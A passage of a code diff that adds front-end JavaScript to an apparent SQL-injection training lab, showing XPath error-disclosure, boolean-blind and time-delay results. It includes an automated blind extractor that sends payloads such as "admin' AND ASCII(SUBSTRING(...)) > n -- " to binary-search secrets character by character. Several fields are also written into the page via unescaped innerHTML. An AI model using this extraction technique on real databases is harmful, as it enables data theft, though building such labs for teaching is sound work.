+            queryDisplay.innerHTML = data.query_tokens.map(t => {
+                if (t.is_injected_keyword) {
+                    return `<span class="text-rose-400 font-bold underline decoration-rose-500/50">${t.text}</span>`;
+                }
+                return `<span class="text-amber-300">${t.text}</span>`;
+            }).join(' ');
+        } else {
+            queryDisplay.innerText = data.constructed_query || 'N/A';
+        }
+
+        // Header metrics
+        document.getElementById('exec-time').innerText = `${data.execution_time_ms.toFixed(2)} ms`;
+        document.getElementById('row-count').innerText = `Rows: ${data.row_count || 0}`;
+        document.getElementById('explanation-text').innerText = data.explanation || '';
+
+        // Status Banner
+        const banner = document.getElementById('status-banner');
+        const heading = document.getElementById('status-heading');
+        const sub = document.getElementById('status-sub');
+        const statusFlag = document.getElementById('status-flag');
+        const flagCard = document.getElementById('flag-card');
+
+        // Results table
+        const tbody = document.getElementById('results-table-body');
+        const tableBadge = document.getElementById('table-badge');
+        tbody.innerHTML = '';
+        tableBadge.innerText = `${data.row_count || 0} records`;
+
+        // XPath Panel updates
+        const xpathLeakBox = document.getElementById('xpath-leak-box');
+        if (data.leaked_data) {
+            xpathLeakBox.innerHTML = `<span class="text-amber-400 font-mono select-all">${data.leaked_data}</span>`;
+        } else if (data.mysql_error_code === 1105) {
+            xpathLeakBox.innerHTML = `<span class="text-rose-400 font-mono">${data.error}</span>`;
+        } else {
+            xpathLeakBox.innerHTML = `<span class="text-gray-600 font-normal italic">No error disclosure in this execution</span>`;
+        }
+
+        // Boolean State updates
+        const boolCard = document.getElementById('boolean-state-card');
+        const boolText = document.getElementById('boolean-state-text');
+        if (data.boolean_state) {
+            boolCard.className = "p-3 rounded-lg border text-sm font-bold flex items-center space-x-2 bg-emerald-950/40 border-emerald-500/40 text-emerald-300";
+            boolCard.innerHTML = `<i data-lucide="check-circle" class="w-4 h-4 text-emerald-400"></i><span>ORACLE RESULT: TRUE (User Found / Predicate Matched)</span>`;
+        } else {
+            boolCard.className = "p-3 rounded-lg border text-sm font-bold flex items-center space-x-2 bg-rose-950/40 border-rose-500/40 text-rose-300";
+            boolCard.innerHTML = `<i data-lucide="x-circle" class="w-4 h-4 text-rose-400"></i><span>ORACLE RESULT: FALSE (Zero Rows / Predicate Evaluated to False)</span>`;
+        }
+
+        // Latency Meter updates
+        const latencyVal = document.getElementById('latency-val');
+        const latencyBar = document.getElementById('latency-bar');
+        const latencyVerdictText = document.getElementById('latency-verdict-text');
+        latencyVal.innerText = `${data.execution_time_ms.toFixed(2)} ms`;
+        
+        // Percent of 3000ms
+        const pct = Math.min(100, Math.max(3, (data.execution_time_ms / 3000) * 100));
+        latencyBar.style.width = `${pct}%`;
+
+        if (data.sleep_detected) {
+            latencyBar.className = "bg-amber-500 h-3 rounded-full transition-all duration-500";
+            latencyVerdictText.innerHTML = `<strong class="text-amber-400">TIME DELAY DETECTED:</strong> Query execution took ${data.execution_time_ms.toFixed(0)} ms (SLEEP evaluated to TRUE). Side-channel confirmed!`;
+        } else {
+            latencyBar.className = "bg-emerald-500 h-3 rounded-full transition-all duration-500";
+            latencyVerdictText.innerHTML = `<span class="text-gray-400">Baseline latency: ${data.execution_time_ms.toFixed(1)} ms. No timing delay observed.</span>`;
+        }
+
+        // Exfiltration & Flag Check
+        if (data.exfiltrated && data.flag) {
+            statusFlag.classList.remove('hidden');
+            flagCard.classList.remove('hidden');
+            document.getElementById('flag-text').innerText = data.flag;
+        } else {
+            statusFlag.classList.add('hidden');
+            flagCard.classList.add('hidden');
+        }
+
+        // Banner Status
+        if (data.mysql_error_code === 1105) {
+            banner.className = "p-3 rounded-xl border flex items-center justify-between bg-amber-950/40 border-amber-500/40 text-amber-300";
+            heading.innerText = "XPath Syntax Error 1105 Triggered!";
+            sub.innerText = data.leaked_data ? `Disclosed: "${data.leaked_data}" inside MySQL error buffer.` : data.error;
+        } else if (data.error) {
+            banner.className = "p-3 rounded-xl border flex items-center justify-between bg-rose-950/30 border-rose-500/40 text-rose-300";
+            heading.innerText = `MySQL Error (${data.mysql_error_code || 'Syntax'})`;
+            sub.innerText = data.error;
+        } else if (data.sleep_detected) {
+            banner.className = "p-3 rounded-xl border flex items-center justify-between bg-amber-950/40 border-amber-500/40 text-amber-300";
+            heading.innerText = "Time Delay Confirmed (>1000 ms)";
+            sub.innerText = `MySQL completed query execution in ${data.execution_time_ms.toFixed(2)} ms.`;
+        } else if (data.success) {
+            banner.className = "p-3 rounded-xl border flex items-center justify-between bg-emerald-950/30 border-emerald-500/40 text-emerald-300";
+            heading.innerText = "Query Executed Successfully";
+            sub.innerText = `Returned ${data.row_count} matching user record(s).`;
+        }
+
+        // Table Rows
+        if (!data.results || data.results.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="5" class="p-4 text-center text-gray-500">0 rows returned by MySQL query.</td></tr>`;
+        } else {
+            data.results.forEach(row => {
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-gray-800/50 transition";
+                tr.innerHTML = `
+                    <td class="p-2.5 text-gray-400">${row.id}</td>
+                    <td class="p-2.5 text-white font-bold">${row.username}</td>
+                    <td class="p-2.5 text-amber-300">${row.full_name || 'N/A'}</td>
+                    <td class="p-2.5 text-gray-300">${row.email || 'N/A'}</td>
+                    <td class="p-2.5 text-emerald-400 uppercase text-[10px] font-bold">${row.role}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        lucide.createIcons();
+    }
+
+    // Automated Algorithmic Blind Extractor Runner
+    async function runAutomatedExtractor() {
+        if (extractorRunning) return;
+        extractorRunning = true;
+        extractorAbort = false;
+
+        document.getElementById('btn-start-extract').classList.add('hidden');
+        document.getElementById('btn-stop-extract').classList.remove('hidden');
+
+        const targetExpr = document.getElementById('extractor-target').value;
+        const outputDiv = document.getElementById('extractor-output');
+        const statsSpan = document.getElementById('extractor-stats');
+        const logDiv = document.getElementById('extractor-log');
+
+        let extractedString = "";
+        let totalQueries = 0;
+        outputDiv.innerText = "_";
+
+        logDiv.innerText = `Initiating binary search extraction for ${targetExpr}...`;
+
+        // Extract up to 32 characters
+        for (let pos = 1; pos <= 32; pos++) {
+            if (extractorAbort) break;
+
+            // First check if character exists at this position
+            const lenPayload = `admin' AND LENGTH(${targetExpr}) >= ${pos} -- `;
+            totalQueries++;
+            const lenRes = await fetchBlindProbe(lenPayload);
+            if (!lenRes.boolean_state) {
+                logDiv.innerText = `Extraction complete! String end reached at position ${pos - 1}.`;
+                break;
+            }
+
+            // Binary search ASCII between 32 and 126
+            let low = 32;
+            let high = 126;
+            let foundChar = null;
+
+            while (low <= high && !extractorAbort) {
+                if (low === high) {
+                    foundChar = String.fromCharCode(low);
+                    break;
+                }
+
+                const mid = Math.floor((low + high) / 2);
+                const probePayload = `admin' AND ASCII(SUBSTRING(${targetExpr}, ${pos}, 1)) > ${mid} -- `;
+                totalQueries++;
+                statsSpan.innerText = `${extractedString.length} chars | ${totalQueries} queries`;
+                logDiv.innerText = `Pos ${pos}: Testing ASCII > ${mid} (${low}..${high})...`;
+
+                const probeRes = await fetchBlindProbe(probePayload);
+                if (probeRes.boolean_state) {
+                    low = mid + 1;
+                } else {
+                    high = mid;
+                }
+            }
+
+            if (foundChar) {
+                extractedString += foundChar;
+                outputDiv.innerText = extractedString + "_";
+                statsSpan.innerText = `${extractedString.length} chars | ${totalQueries} queries`;
+                logDiv.innerText = `Pos ${pos}: Resolved char '${foundChar}' (ASCII ${foundChar.charCodeAt(0)})`;
+            }
+
+            // Small delay for UI animation
+            await new Promise(r => setTimeout(r, 60));
+        }
+
+        outputDiv.innerText = extractedString;
+        statsSpan.innerText = `${extractedString.length} chars | ${totalQueries} queries`;
+        stopAutomatedExtractor();
+
+        if (extractedString.includes('FLAG{') || extractedString.includes('flag')) {
+            document.getElementById('status-flag').classList.remove('hidden');
+            document.getElementById('flag-card').classList.remove('hidden');
+            document.getElementById('flag-text').innerText = extractedString;
+        }
+    }
+
+    function stopAutomatedExtractor() {
+        extractorAbort = true;
+        extractorRunning = false;
+        document.getElementById('btn-start-extract').classList.remove('hidden');
+        document.getElementById('btn-stop-extract').classList.add('hidden');
+    }
+
+    async function fetchBlindProbe(payload) {
+        try {
+            const resp = await fetch('/api/error-blind/query', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: payload,
+                    scenario: 'boolean_blind',
+                    mode: currentMode
+                })
+            });
+            return await resp.json();
+        } catch (e) {
+            return { boolean_state: false };
+        }
+    }
+
+    async function fetchAuditLogs() {
+        try {
+            const resp = await fetch('/api/audit-logs');
+            const data = await resp.json();
+            const tbody = document.getElementById('audit-table-body');
+            tbody.innerHTML = '';
+
+            if (!data.logs || data.logs.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" class="p-3 text-center text-gray-500">No queries executed yet.</td></tr>`;
+                return;
+            }
+
+            data.logs.forEach(log => {
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-gray-800/50 transition";
+                const isParamBadge = log.is_parameterized 
+                    ? `<span class="px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">YES</span>`
+                    : `<span class="px-1.5 py-0.5 rounded text-[10px] bg-rose-500/20 text-rose-400 border border-rose-500/30">NO</span>`;
+                
+                let statusBadge = `<span class="text-gray-400">${log.execution_status}</span>`;
+                if (log.execution_status === 'SUCCESS') {
+                    statusBadge = `<span class="text-emerald-400 font-bold">SUCCESS</span>`;
+                } else if (log.execution_status === 'MYSQL_ERROR') {
+                    statusBadge = `<span class="text-rose-400 font-bold">ERROR</span>`;
+                }
+
+                tr.innerHTML = `
+                    <td class="p-2.5 text-gray-500">#${log.id}</td>
+                    <td class="p-2.5 text-amber-300 font-medium">${log.lab_module}</td>
+                    <td class="p-2.5 text-yellow-300/90 max-w-xs truncate" title="${log.executed_query}">${log.executed_query}</td>
+                    <td class="p-2.5">${isParamBadge}</td>
+                    <td class="p-2.5">${statusBadge}</td>
+                    <td class="p-2.5 text-gray-500 text-[10px]">${log.timestamp || ''}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        } catch (e) {
+            console.error("Failed to load audit logs", e);
+        }
+    }
+
+    // Initialize View
+    setScenario('xpath_error');
+    fetchAuditLogs();
+</script>
 {% endblock %}
